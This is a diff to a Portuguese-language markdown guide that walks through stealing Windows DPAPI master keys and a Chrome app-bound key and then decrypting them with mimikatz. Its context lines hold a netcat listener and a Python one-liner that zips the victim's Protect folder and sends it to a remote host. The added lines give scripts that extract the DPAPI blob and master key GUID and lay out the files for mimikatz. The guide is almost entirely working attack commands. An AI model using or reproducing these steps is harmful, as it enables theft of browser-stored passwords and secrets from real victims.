@@ -324,4 +324,53 @@ nc -lvnp 9999 > master_keys.zip
 ``` cmd
 python -c "import os, socket, shutil; protect_path = os.environ['APPDATA'] + r'\Microsoft\Protect'; shutil.make_archive(r'%TEMP%\master_keys', 'zip', protect_path); s = socket.socket(); s.connect(('10.0.0.34', 9999)); f = open(r'%TEMP%\master_keys.zip', 'rb'); s.send(f.read()); f.close(); s.close(); print('Master Keys enviadas!')"
 ```
+
+### Extratir o dpapi_blob.bin do arquivo app_bound_key.json
+``` cmd
+cat > generate_dpapi_blob.py << 'EOF'
+import base64
+import json
+
+# Se você tem o JSON salvo:
+with open('app_bound_key.json', 'r') as f:
+    data = json.load(f)
+
+app_bound_key_b64 = data['app_bound_key']
+
+# Decodifica o base64
+full_blob = base64.b64decode(app_bound_key_b64)
+
+# Remove o prefixo "APPB" (4 bytes)
+dpapi_blob = full_blob[4:]
+
+# Salva o blob DPAPI puro
+with open('dpapi_blob.bin', 'wb') as f:
+    f.write(dpapi_blob)
+
+print(f"dpapi_blob.bin criado: {len(dpapi_blob)} bytes")
+print(f"Primeiros 32 bytes: {dpapi_blob[:32].hex()}")
+EOF
+```
+### Agora Rode
+``` cmd
+python3 generate_dpapi_blob.py
+```
+
+### Extratir o GUID do Master Key
+``` cmd
+unzip master_keys.zip
+ls -1 S-1-5-21-773915915-3807088668-3152298174-1001/ | grep -v Preferred > mk_guid.txt
+rm master_keys.zip
+```
+
+### Crie nova pasta e mova os seguintes arquivos exemplo
+``` cmd
+C:\Users\maciel\Desktop\decrypt\
+├── dpapi_blob.bin          ← blob DPAPI puro
+├── mk_guid.txt              ← contém o GUID (ex: 8427e0e4-56bc-4dc2-a061-73ba5b516e24)
+├── mimikatz.exe             ← copie da pasta x64
+└── S-1-5-21-773915915-3807088668-3152298174-1001\
+    └── 8427e0e4-56bc-4dc2-a061-73ba5b516e24  ← Master Key
+```
+
 ### 7.0. AGORA É COM VOCÊ USE (MIMIKTZ) github.com/gentilkiwi/mimikatz
